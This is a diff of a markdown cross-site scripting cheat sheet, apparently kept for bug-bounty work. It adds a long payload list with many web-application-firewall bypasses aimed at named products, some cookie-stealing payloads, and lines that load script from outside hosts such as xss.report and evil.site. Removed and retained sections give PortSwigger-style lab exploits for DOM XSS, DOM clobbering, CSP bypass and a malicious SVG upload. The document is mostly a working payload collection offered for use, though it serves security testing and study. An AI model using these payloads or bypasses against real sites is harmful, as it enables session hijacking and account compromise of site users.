@@ -1,6 +1,6 @@
-- **Example For Vulnerable codes**
+# **Example For Vulnerable code**
     
-    ```php
+```php
     <!DOCTYPE html>
     <html>
     <body>
@@ -12,7 +12,7 @@
     
     </body>
     </html>
-    ```
+```
     
 - **Mitigation code**
     
@@ -203,9 +203,177 @@
         upload a picture file, intercept it, change picturename.jpg to xss payload using intruder attack
         ```
         
-- **polyglots**
+# Payload list 
+```html
+# karem bayloads
+'"><script>alert('karem')</script> 
+'"><img src=1 onerror="alert('Karem')">
+'"><img src=1 onkarem=1 onerror="alert('Karem')"> 
+<script/src=//6a%2elv></script> 
+'"></script><script>alert(document.cookie)</script> 
+%27"accesskey="x" onclick="alert(document.cookie)" x=" 
+"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS 
+<details/open=/open/href=/data=;+ontoggle="(alert)(document.cookie)> 
+"><iframe/src=javascript:alert%26%23x000000028%3b)> 
+%22%3E%3Ciframe/src%3Djavascript%3Aalert%2526%2523x000000028%253b%29%3E%0A 
+<svg onload=prompt%26%230000000040document.domain)> 
+<h1 onmouseover="alert('karem')" style="color: red;">karem</h1> 
+"><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)> 
+"><a href="javascript:alert('xss')">clickme</a>
+<svg onload=prompt%26%230000000040document.domain)> 
+ '"><script>alert('karem')</script>@gmail.com 
+%0Dalert`1`// 
+"<script>alert</script>"@gmail.com 
+"><img src=1 OnErRoR=alert('xss')> 
+'"><script src=https://xss.report/c/karemelsqary74></script> 
+"><svg/onload=alert.bind()(document.domain)> 
+'`><\x00img src=xxx:x onerror=javascript:alert(1)> 
+'"><<Svg/Only=1/OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+
+# h0tak88r
+<style>*{background-image:url('\\\\6A\\\\61\\\\76\\\\61\\\\73\\\\63\\\\72\\\\69\\\\70\\\\74\\\\3A\\\\61\\\\6C\\\\65\\\\72\\\\74\\\\28\\\\6C\\\\6F\\\\63\\\\61\\\\74\\\\69\\\\6F\\\\6E\\\\29')}</style>
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
+[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+"><input/onauxclick="[1].map(prompt)">
+<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
+'"--><Body onbeforescriptexecute="[1].map(confirm)">
+'-prompt.call(window, 'xss')-'
+<svg+onload=innerHTML=URL,outerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
+<img src=x onVector=X-Vector onerror=alert(1)>
+%2sscript%2ualert()%2s/script%2u
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+toString=\\\\u0061lert;window+' '
+aaaaa<h1 onclick=alert(1)>test
+<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
+"><img src=x onODYSsyi=1 onerror=alert(document.cookie)>
+
+
+# Quick Defense:
+<input type="search" onsearch="aler\\\\u0074(1)">
+<details ontoggle="aler\\\\u0074(1)">
+
+# IMG_error
+<img onerror="location='javascript:=lert(1)'" src="x">
+<img onerror="location='javascript:%61lert(1)'" src="x">
+<img onerror="location='javascript:\\x2561lert(1)'" src="x">
+<img onerror="location='javascript:\\x255Cu0061lert(1)'" src="x" >
+
+# Unicode + HTML
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+
+# URL
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+
+# Hex
+<script>eval('\\\\x61lert(1)')</script>
+
+# Only lowercase block
+<sCRipT>alert(1)</sCRipT>
+
+# Break regex
+<script>%0aalert(1)</script>
+
+# Recursive filters
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# Inject anchor tag
+<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+
+# Bypass whitespaces
+<svg·onload=alert(1)>
+
+# Brutelogic
+\\'-alert(1)//
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus!
+
+# Imperva Incapsula
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
+<img/src="x"/onerror="[JS-F**K Payload]">
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\\\\ert\\\\`1\\\\``'>
+
+# WebKnight
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+
+# F5 Big IP
+<body style="height:1000px" onwheel="[DATA]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
+<body style="height:1000px" onwheel="[JS-F**k Payload]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
+
+# PHP-IDS
+<svg+onload=+"[DATA]"
+<svg+onload=+"aler%25%37%34(1)"
+
+# Mod-Security
+<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+
+# Sucuri WAF
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+
+# Akamai
+1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
+<SCr%00Ipt>confirm(1)</scR%00ipt>
+
+# AngularJS
+{{constructor.constructor(alert 1 )()}}
+
+#html Sanitization Bypass
+<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+
+# Bypass ‘ ‘ ( ) 
+<iframe/src=javascript:alert%26%23x000000028%3b%27hacked%27)>
+
+# waf Bypass SVG
+<svg><a xlink:href=?usemap=/*&#x26;#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;*/onmouseover=window.focus()//>Hover me</a></svg>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+
+# XSS in email Section
+admin1@example.com<script>alert('xss');</script> 
+“><svg/onload=confirm(1)>”@x.y 
+"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com 
+["');alert('XSS');//"]@xyz.xxx 
+"<svg/onload=alert(1)>"@gmail.com 
+test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E
+
+# XSS Bypass for Rich Text Editors
+<</p>iframe src=javascript:alert()//
+<a href="aaa:bbb">x</a>
+<a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
+[Click on me to claim 100$ vouchers](<https://evil.com>) -> Hyperlink Injection
+
+# XSS Reflected in JSON Format and “{}” Forbidden
+test%2Aconsole.log(1337)//’;
+
+# XSS Reflected in `<link>` OR `<input type=hidden>` attribute when add param
+/?lol=h0tak88r’accesskey=’x’onclick=’alert(0)’ # But the Victim must click ALT+SHIFT+X
+
+
+
+# [Jhaddix](https://github.com/R0X4R/D4rkXSS/blob/master/jhaddix.txt)
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+<<scr\\0ipt/src=http://xss.com/xss.js></script%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
+' onmouseover=alert(/Black.Spook/)
+
+# [RSnake](https://github.com/R0X4R/D4rkXSS/blob/master/rsnake.txt)
+<SCRIPT>alert('XSS');</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>   
+
+# [Mario](https://github.com/R0X4R/D4rkXSS/blob/master/mario.txt)
+<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>
+
+
+```
+
+# **polyglots**
     
-    ```jsx
+```jsx
     jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
     ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
     “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
@@ -218,407 +386,58 @@
     javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
     javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
     javascript://--></title></style></textarea></script><svg "//' onclick=alert()///</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
-    ```
-    
-
-### **Waf Bypass Payloads**
-
-- Collected Payloads
-    
-    ```html
-    <style>*{background-image:url('\\\\6A\\\\61\\\\76\\\\61\\\\73\\\\63\\\\72\\\\69\\\\70\\\\74\\\\3A\\\\61\\\\6C\\\\65\\\\72\\\\74\\\\28\\\\6C\\\\6F\\\\63\\\\61\\\\74\\\\69\\\\6F\\\\6E\\\\29')}</style>
-    %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
-    [̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
-    "><input/onauxclick="[1].map(prompt)">
-    <img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />
-    '"--><Body onbeforescriptexecute="[1].map(confirm)">
-    '-prompt.call(window, 'xss')-'
-    <svg+onload=innerHTML=URL,outerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
-    <img src=x onVector=X-Vector onerror=alert(1)>
-    %2sscript%2ualert()%2s/script%2u
-    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
-    toString=\\\\u0061lert;window+' '
-    aaaaa<h1 onclick=alert(1)>test
-    <noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
-    
-    # Quick Defense:
-    <input type="search" onsearch="aler\\\\u0074(1)">
-    <details ontoggle="aler\\\\u0074(1)">
-    
-    # Unicode + HTML
-    <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
-    
-    # URL
-    <a href="javascript:x='%27-alert(1)-%27';">XSS</a>
-    
-    # Hex
-    <script>eval('\\\\x61lert(1)')</script>
-    
-    # Only lowercase block
-    <sCRipT>alert(1)</sCRipT>
-    
-    # Break regex
-    <script>%0aalert(1)</script>
-    
-    # Recursive filters
-    <scr<script>ipt>alert(1)</scr</script>ipt>
-    
-    # Inject anchor tag
-    <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
-    
-    # Bypass whitespaces
-    <svg·onload=alert(1)>
-    
-    # Change GET to POST request
-    
-    # Imperva Incapsula
-    %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
-    <img/src="x"/onerror="[JS-F**K Payload]">
-    <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\\\\ert\\\\`1\\\\``'>
-    
-    # WebKnight
-    <details ontoggle=alert(1)>
-    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
-    
-    # F5 Big IP
-    <body style="height:1000px" onwheel="[DATA]">
-    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
-    <body style="height:1000px" onwheel="[JS-F**k Payload]">
-    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
-    <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
-    <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
-    
-    # PHP-IDS
-    <svg+onload=+"[DATA]"
-    <svg+onload=+"aler%25%37%34(1)"
-    
-    # Mod-Security
-    <a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
-    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
-    <b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
-    
-    # Sucuri WAF
-    1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
-    
-    # Akamai
-    1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
-    <SCr%00Ipt>confirm(1)</scR%00ipt>
-    
-    # AngularJS
-    {{constructor.constructor(alert 1 )()}}
-    
-    #html Sanitization Bypass
-    <00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
-    
-    # Bypass ‘ ‘ ( ) 
-    <iframe/src=javascript:alert%26%23x000000028%3b%27hacked%27)>
-    # waf Bypass SVG
-    <svg><a xlink:href=?usemap=/*&#x26;#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;*/onmouseover=window.focus()//>Hover me</a></svg>
-    <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
-    <textarea/onbeforeinput=kuro=&[#x27](tg://search_hashtag?hashtag=x27);//domain.tld&[#x27](tg://search_hashtag?hashtag=x27);;import(kuro)%09autofocus%09x>
-    <div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
-    Payload before obfuscation: <div onpointerover="javascript:alert([document.domain](http://document.domain/?trk=public_post-text))" style="width:100%;height:100vh;"></div>
-    ```
-    
-- [NO SCRIPT](https://github.com/R0X4R/D4rkXSS/blob/master/noscript.txt)
-    
-    ```html
-    <acronym><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
-    <bgsound><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
-    <xmp><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
-    ">'><details/open/ontoggle=confirm('XSS')>
-    incapsulate bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
-    ```
-    
-- [Brutelogic](https://github.com/R0X4R/D4rkXSS/blob/master/brutelogic.txt)
-    
-    ```html
-    \\'-alert(1)//
-    </script><svg onload=alert(1)>
-    <x contenteditable onblur=alert(1)>lose focus!
-    ```
-    
-- **IMG Error**
-    
-    ```html
-    <img onerror="location='javascript:=lert(1)'" src="x">
-    <img onerror="location='javascript:%61lert(1)'" src="x">
-    <img onerror="location='javascript:\\x2561lert(1)'" src="x">
-    <img onerror="location='javascript:\\x255Cu0061lert(1)'" src="x" >
-    ```
-    
-- [Jhaddix](https://github.com/R0X4R/D4rkXSS/blob/master/jhaddix.txt)
-    
-    ```jsx
-    '%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
-    <<scr\\0ipt/src=http://xss.com/xss.js></script
-    %27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
-    ' onmouseover=alert(/Black.Spook/)
-    ```
-    
-- [RSnake](https://github.com/R0X4R/D4rkXSS/blob/master/rsnake.txt)
-    
-    ```jsx
-    <SCRIPT>alert('XSS');</SCRIPT>
-    '';!--"<XSS>=&{()}
-    <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-    ```
-    
-- [Mario](https://github.com/R0X4R/D4rkXSS/blob/master/mario.txt)
-    
-    ```jsx
-    <div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>
-    ```
-    
-- [seXSS](https://github.com/R0X4R/D4rkXSS/blob/master/seXSS.md)****
-    
-    > **Search Engine XSS [ google,yaho,…. ]**
-    
-- `${alert(1)}` ****Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped****
-    
-    ```jsx
-    <script>
-           var message = `0 search results for '\\u003clol\\u003e'`;
-           document.getElementById('searchMessage').innerText = message;
-    </script>
-    ```
-    
-- ****Reflected XSS in a JavaScript URL with some characters blocked****
-    
-    ```jsx
-    <https://0acb00f104aa459e80797b07005f0087.web-security-academy.net/post?postId=5&%27>},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
-    ```
-    
-- ****Reflected XSS with AngularJS sandbox escape without strings****
-    
-    ```jsx
-    <https://0ab200eb039caf1281bdacc000a5007e.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1>]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
-    ```
-    
-- ****Reflected XSS with AngularJS sandbox escape and CSP****
-    
-    ```jsx
-    <script>
-    location='<https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x>';
-    </script>
-    ```
-    
-- ****Reflected XSS protected by CSP, with CSP bypass****
-    
-    ```jsx
-    <https://0a67007704633ac081cf08c8008f006c.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27>
-    ```
-    
-- **Check for Dom-XSS in Swagger-UI**
-    
-    - [https://github.com/doosec101/swagger_scanner](https://github.com/doosec101/swagger_scanner)
+```
+# DOM XSS
+### **Check for Dom-XSS in Swagger-UI**
+- [https://github.com/doosec101/swagger_scanner](https://github.com/doosec101/swagger_scanner)
     - configUrl=https://jumpy-floor.surge.sh/test.json
     - ?url=https://jumpy-floor.surge.sh/test.yaml
-- **[DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)**
+###  **[DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)**
     
-    **Vulnerable Code**
+**Vulnerable Code**
     
-    ```jsx
+```jsx
     <script>
-                            window.addEventListener('message', function(e) {
-                                document.getElementById('ads').innerHTML = e.data;
-                            })
-                        </script>
-    ```
+        window.addEventListener('message', function(e) {
+        document.getElementById('ads').innerHTML = e.data;
+        })
+    </script>
+```
     
-    **Exploit**
-    
-    ```python
-    <iframe src="<https://target.com/>" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
-    ```
+**Exploit** 
+ ```python
+<iframe src="<https://target.com/>" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+```
     
 - **[DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)**
-    
-    **Vulnerable code**
-    
-    ```jsx
-    <script>
-                            window.addEventListener('message', function(e) {
-                                var url = e.data;
-                                if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
-                                    location.href = url;
-                                }
-                            }, false);
-                        </script>
-    ```
-    
-    **Exploit**
-    
-    ```python
-    <iframe src="<https://target.com/>" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
-    ```
-    
 - **[DOM XSS using web messages and `JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)**
-    
-    **Vulnerable code**
-    
-    ```jsx
-    <script>
-                            window.addEventListener('message', function(e) {
-                                var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
-                                document.body.appendChild(iframe);
-                                try {
-                                    d = JSON.parse(e.data);
-                                } catch(e) {
-                                    return;
-                                }
-                                switch(d.type) {
-                                    case "page-load":
-                                        ACMEplayer.element.scrollIntoView();
-                                        break;
-                                    case "load-channel":
-                                        ACMEplayer.element.src = d.url;
-                                        break;
-                                    case "player-height-changed":
-                                        ACMEplayer.element.style.width = d.width + "px";
-                                        ACMEplayer.element.style.height = d.height + "px";
-                                        break;
-                                }
-                            }, false);
-                        </script>
-    ```
-    
-    **Exploit**
-    
-    ```jsx
-    <iframe src=https://<target.com>/ onload='this.contentWindow.postMessage("{\\"type\\":\\"load-channel\\",\\"url\\":\\"javascript:print()\\"}","*")'>
-    ```
-    
 - **[DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)**
-    
-    **Vulnerable Request**
-    
-    ```jsx
-    GET /product?productId=3 HTTP/2
-    Host: 0a0500aa03c741a680172b2f00f4006e.web-security-academy.net
-    Cookie: session=UqxhvcAmNGiFKyXTtDcZjENQWUSSiQUL; lastViewedProduct=https://0a0500aa03c741a680172b2f00f4006e.web-security-academy.net/product?productId=1
-    Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
-    Sec-Ch-Ua-Mobile: ?0
-    Sec-Ch-Ua-Platform: "Windows"
-    Upgrade-Insecure-Requests: 1
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-    Sec-Fetch-Site: same-origin
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-User: ?1
-    Sec-Fetch-Dest: document
-    Referer: <https://0a0500aa03c741a680172b2f00f4006e.web-security-academy.net/>
-    Accept-Encoding: gzip, deflate
-    Accept-Language: en-US,en;q=0.9
-    ```
-    
-    **Exploit**
-    
-    ```jsx
-    <iframe src="https://<target.com>/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://<target.com>';window.x=1;">
-    ```
-    
 - **[Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)**
-    
-    **Vulnerable code**
-    
-    ```jsx
-    let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
-    ```
-    
-    **Exploit**
-    
-    ```jsx
-    <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
-    ```
-    
-    **Explain**
-    
-    The `defaultAvatar` object is implemented using this dangerous pattern containing the logical `OR` operator in conjunction with a global variable. This makes it vulnerable to [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering).
-    
-    You can clobber this object using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The `name` attribute in the second anchor contains the value `"avatar"`, which will clobber the `avatar` property with the contents of the `href` attribute.
-    
-    Notice that the site uses the `DOMPurify` filter in an attempt to reduce [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based). However, `DOMPurify` allows you to use the `cid:` protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the `defaultAvatar` variable to be assigned the clobbered property `{avatar: ‘cid:"onerror=alert(1)//’}` the next time the page is loaded.
-    
-    When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the `onerror` event handler and triggers the `alert()`
-    
 - **[Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)**
-    
-    **exploit**
-    
-    ```jsx
-    Go to one of the blog posts and create a comment containing the following HTML:
-    <form id=x tabindex=0 onfocus=print()><input id=attributes>
-    ----------------------------------------------------------------------------------------------------------
-    Go to the exploit server and add the following iframe to the body:
-    <iframe src=https://<target.com>.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
-    ```
-    
-    **Explain**
-    
-    The library uses the `attributes` property to filter HTML attributes. However, it is still possible to clobber the `attributes` property itself, causing the length to be undefined. This allows us to inject any attributes we want into the `form` element. In this case, we use the `onfocus` attribute to smuggle the `print()` function.
-    
-    When the `iframe` is loaded, after a 500ms delay, it adds the `#x` fragment to the end of the page URL. The delay is necessary to make sure that the comment containing the injection is loaded before the JavaScript is executed. This causes the browser to focus on the element with the ID `"x"`, which is the form we created inside the comment. The `onfocus` event handler then calls the `print()` function.
-    
-- **Stored XSS via SVG file**
-    
-    is an example of a basic SVG file that will show a picture of a `rectang`
-    
-    ```
+# Stored XSS
+## **Stored XSS via SVG file**
+  
+is an example of a basic SVG file that will show a picture of a `rectang`
+```
     <svg width="400" height="110">  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> </svg><!--This means you can place an SVG file in an image tag and it will render perfectly:--><img src="rectangle.svg" alt="Rectangle" height="42" width="42"><!-- An example SVG file with an alert XSS payload can be found below:--><?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "<http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd>"><svg version="1.1" baseProfile="full" xmlns="<http://www.w3.org/2000/svg>"> <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> <script type="text/javascript"> alert("h0tak88r_XSS"); </script></svg>
+```
+
+
+
+# some bypasses Techniques
+- **XSS for `.JSON` endpoint [ bypass (`.html`)and `WAF` ]**
     
-    ```
-    
-- **XSS Reflected in JSON Format and “{}” Forbidden**
-    
-    - [ ] `/?q=test%2Aconsole.log(1337)//’;`
-    
-    ![https://user-images.githubusercontent.com/108616378/219940132-46f7abe3-2ac4-425d-aa29-09e54d2c62b4.png](https://user-images.githubusercontent.com/108616378/219940132-46f7abe3-2ac4-425d-aa29-09e54d2c62b4.png)
-    
-- **XSS Reflected in `<link>` OR `<input type=hidden>` attribute when add param**
-    
-    - [ ] `/?lol=h0tak88r’accesskey=’x’onclick=’alert(0)’` But the Victim must click `ALT+SHIFT+X`
-    
-    ![https://user-images.githubusercontent.com/108616378/219940162-49b746e2-b5a2-46ff-bcd2-0d2755a131a8.png](https://user-images.githubusercontent.com/108616378/219940162-49b746e2-b5a2-46ff-bcd2-0d2755a131a8.png)
-    
-- **XSS in email section**
-    
-    ```jsx
-    admin1@example.com<script>alert('xss');</script> 
-    “><svg/onload=confirm(1)>”@x.y 
-    "hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com 
-    ["');alert('XSS');//"]@xyz.xxx 
-    "<svg/onload=alert(1)>"@gmail.com 
-    test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E
-    
-    ```
-    
-- **XSS for .JSON endpoint [ bypass (`.html`)and `WAF` ]**
-    
-    - [ ] `“resource Type” : “silent:nonexitsting”` Function
+    -  `“resource Type” : “silent:nonexitsting”` Function
         
         ![https://user-images.githubusercontent.com/108616378/219940178-c7988e77-c51a-4e79-add2-e0b192d92e02.png](https://user-images.githubusercontent.com/108616378/219940178-c7988e77-c51a-4e79-add2-e0b192d92e02.png)
         
-    - [ ] Use `url-encoded` payload with .`htm` extension and `//` for break directory block too , So the server so the server didn’t understand my request fully
+    -  Use `url-encoded` payload with .`htm` extension and `//` for break directory block too , So the server so the server didn’t understand my request fully
         
-    - [ ] POC
-        
-    
+    - POC
     ```
     <https://www.redacted.com/etc/designs/redacted.json//%3Csvg%20onload=alert(document.domain)%3E.html>
     
     ```
-    
-- **XSS Bypass for Rich Text Editors**
-    
-    ```jsx
-    First, try all the built-in functions like bold, links, and embedded images.
-    <</p>iframe src=javascript:alert()//
